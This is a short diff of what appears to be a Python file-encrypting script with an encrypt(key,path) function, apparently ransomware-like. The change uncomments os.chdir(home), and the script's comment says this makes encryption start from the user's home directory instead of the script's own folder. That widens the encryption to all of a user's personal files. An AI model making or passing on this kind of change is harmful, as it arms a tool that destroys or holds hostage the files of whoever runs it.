@@ -51,7 +51,7 @@ def encrypt(key,path):
 
 
 home = str(Path.home())
-#os.chdir(home) -------> uncomment this to start encryption from the home directory or 
+os.chdir(home) #-------> uncomment this to start encryption from the home directory or 
 			#else the script encrypts from the directory where the script is present 
 	
 
